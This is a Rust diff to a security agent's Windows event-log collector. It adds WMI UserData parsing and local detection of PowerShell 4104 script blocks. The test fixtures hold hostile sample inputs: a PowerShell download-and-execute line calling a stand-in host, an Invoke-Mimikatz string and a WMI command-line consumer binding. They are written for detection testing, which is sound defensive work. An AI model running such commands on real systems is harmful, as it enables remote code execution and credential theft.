@@ -137,23 +137,48 @@ fn parse(xml: &str, channel: &str) -> Result<(u64, LogEventData, Option<UserLogo
         .root_element()
         .children()
         .find(|n| n.has_tag_name("EventData"));
-    for n in event_data
+    // Some providers (WMI-Activity 5861) write `<UserData><Operation>
+    // <Field>text</Field>...` instead of named `<Data>`; flatten the first
+    // operation element's children under the same limits.
+    let user_fields: Vec<(String, String)> = if event_data.is_none() {
+        doc.root_element()
+            .children()
+            .find(|n| n.has_tag_name("UserData"))
+            .and_then(|u| u.children().find(|n| n.is_element()))
+            .map(|op| {
+                op.children()
+                    .filter(|n| n.is_element())
+                    .map(|n| {
+                        (
+                            n.tag_name().name().to_string(),
+                            n.text().unwrap_or("").to_string(),
+                        )
+                    })
+                    .collect()
+            })
+            .unwrap_or_default()
+    } else {
+        Vec::new()
+    };
+    let named = event_data
         .into_iter()
         .flat_map(|n| n.children())
         .filter(|n| n.has_tag_name("Data"))
-    {
-        if let Some(name) = n.attribute("Name") {
-            if fields.len() >= 258 || name.len() > 256 || fields.contains_key(name) {
-                bail!("invalid or duplicate event data field");
-            }
-            let (value, truncation) =
-                crate::telemetry::limits::truncate_str(n.text().unwrap_or(""), 16 * 1024);
-            if let Some(truncation) = truncation {
-                truncated_fields.insert(format!("fields.{name}"), truncation);
-                crate::telemetry::metrics::metrics().enrichment_truncation();
-            }
-            fields.insert(name.into(), serde_json::Value::String(value));
+        .filter_map(|n| {
+            n.attribute("Name")
+                .map(|name| (name.to_string(), n.text().unwrap_or("").to_string()))
+        });
+    for (name, text) in named.chain(user_fields) {
+        let name = name.as_str();
+        if fields.len() >= 258 || name.len() > 256 || fields.contains_key(name) {
+            bail!("invalid or duplicate event data field");
         }
+        let (value, truncation) = crate::telemetry::limits::truncate_str(&text, 16 * 1024);
+        if let Some(truncation) = truncation {
+            truncated_fields.insert(format!("fields.{name}"), truncation);
+            crate::telemetry::metrics::metrics().enrichment_truncation();
+        }
+        fields.insert(name.into(), serde_json::Value::String(value));
     }
     // 4624/4625 become structured logon events; the operating system's own
     // service/machine logons (SYSTEM, DWM, machine accounts) are dropped.
@@ -432,6 +457,37 @@ fn audit_tamper_event(
     )
 }
 
+/// Findings for one PowerShell 4104 record. The raw record is not kept.
+fn script_block_events(data: &LogEventData, agent_id: &str, hostname: &str) -> Vec<AgentEvent> {
+    let is_4104 = data.fields.get("EventID").and_then(|v| v.as_u64()) == Some(4104)
+        && data.source_path == windows_native::POWERSHELL_CHANNEL
+        && data.proc.as_deref() == Some("Microsoft-Windows-PowerShell");
+    let text = data
+        .fields
+        .get("ScriptBlockText")
+        .and_then(|v| v.as_str())
+        .unwrap_or("");
+    if !is_4104 || text.is_empty() {
+        return Vec::new();
+    }
+    trapd_detection::windows_script_rules::inspect_script_block(text)
+        .into_iter()
+        .filter_map(|d| {
+            native_provenance(
+                AgentEvent::new(
+                    agent_id.into(),
+                    hostname.into(),
+                    EventClass::Detection,
+                    EventAction::Detected,
+                    Severity::Medium,
+                    EventData::Detection(Box::new(d)),
+                ),
+                data,
+            )
+        })
+        .collect()
+}
+
 pub struct EventLogCollector {
     config: Arc<RwLock<AgentConfig>>,
     durable_handoff: bool,
@@ -511,6 +567,8 @@ impl Collector for EventLogCollector {
                 "System",
                 "Application",
                 windows_native::SYSMON_CHANNEL,
+                windows_native::WMI_CHANNEL,
+                windows_native::POWERSHELL_CHANNEL,
             ] {
                 let cursor = cursors.get(channel).copied();
                 let records = match tokio::task::spawn_blocking(move || read(channel, cursor))
@@ -585,6 +643,29 @@ impl Collector for EventLogCollector {
                             continue;
                         }
                     };
+                    // Script blocks are judged locally and never forwarded: only the
+                    // findings leave the host. Like the other channels, the first
+                    // start tails from the newest record without replaying history.
+                    if channel == windows_native::POWERSHELL_CHANNEL {
+                        if cursor.is_some() {
+                            for ev in script_block_events(&data, &agent_id, &hostname) {
+                                if tx.send(ev).await.is_err() {
+                                    return Ok(());
+                                }
+                            }
+                        }
+                        cursors.insert(channel.into(), record);
+                        continue;
+                    }
+                    // WMI-Activity is mostly noise and query text: keep only the
+                    // subscription-registered event, advance past the rest.
+                    if channel == windows_native::WMI_CHANNEL
+                        && data.fields.get("EventID").and_then(|v| v.as_u64())
+                            != Some(windows_native::WMI_SUBSCRIPTION_EVENT)
+                    {
+                        cursors.insert(channel.into(), record);
+                        continue;
+                    }
                     let first_attempt = if cursor.is_some() {
                         match pending_native.prepare(
                             channel,
@@ -700,6 +781,47 @@ impl Collector for EventLogCollector {
 
 #[cfg(test)]
 mod tests {
+    #[test]
+    fn script_blocks_yield_findings_without_the_script_text() {
+        let xml = "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>\
+<Provider Name='Microsoft-Windows-PowerShell'/><EventID>4104</EventID>\
+<TimeCreated SystemTime='2026-10-10T17:25:49.1747246Z'/><EventRecordID>9</EventRecordID>\
+<Computer>H</Computer></System><EventData>\
+<Data Name='ScriptBlockText'>$p='Password123-do-not-leak'; IEX (New-Object Net.WebClient).DownloadString('http://x')</Data>\
+</EventData></Event>";
+        let (_, data, _) = parse(xml, windows_native::POWERSHELL_CHANNEL).unwrap();
+        let evs = script_block_events(&data, "a", "h");
+        assert_eq!(evs.len(), 1);
+        let dump = serde_json::to_string(&evs[0]).unwrap();
+        assert!(!dump.contains("Password123"), "{dump}");
+        assert!(dump.contains("execution.powershell_download_exec"));
+    }
+
+    #[test]
+    fn script_blocks_from_the_wrong_provider_are_ignored() {
+        let xml = "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>\
+<Provider Name='Evil'/><EventID>4104</EventID>\
+<TimeCreated SystemTime='2026-10-10T17:25:49.1747246Z'/><EventRecordID>9</EventRecordID>\
+<Computer>H</Computer></System><EventData><Data Name='ScriptBlockText'>Invoke-Mimikatz</Data></EventData></Event>";
+        let (_, data, _) = parse(xml, windows_native::POWERSHELL_CHANNEL).unwrap();
+        assert!(script_block_events(&data, "a", "h").is_empty());
+    }
+
+    #[test]
+    fn userdata_events_expose_their_fields() {
+        let xml = "<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System>\
+<Provider Name='Microsoft-Windows-WMI-Activity'/><EventID>5861</EventID>\
+<TimeCreated SystemTime='2026-10-10T17:25:49.1747246Z'/><EventRecordID>7</EventRecordID>\
+<Computer>H</Computer></System><UserData><Operation_ESStoConsumerBinding xmlns='x'>\
+<Namespace>//./root/subscription</Namespace><CONSUMER>CommandLineEventConsumer=\"a\"</CONSUMER>\
+<PossibleCause>Binding EventFilter</PossibleCause></Operation_ESStoConsumerBinding></UserData></Event>";
+        let (_, data, _) = parse(xml, crate::collectors::windows_native::WMI_CHANNEL).unwrap();
+        assert_eq!(data.fields["EventID"], 5861);
+        assert_eq!(data.fields["CONSUMER"], "CommandLineEventConsumer=\"a\"");
+        assert_eq!(data.fields["Namespace"], "//./root/subscription");
+        assert_eq!(data.proc.as_deref(), Some("Microsoft-Windows-WMI-Activity"));
+    }
+
     use super::*;
     #[test]
     fn native_xml_preserves_unicode_auth_identity_and_record_id() {
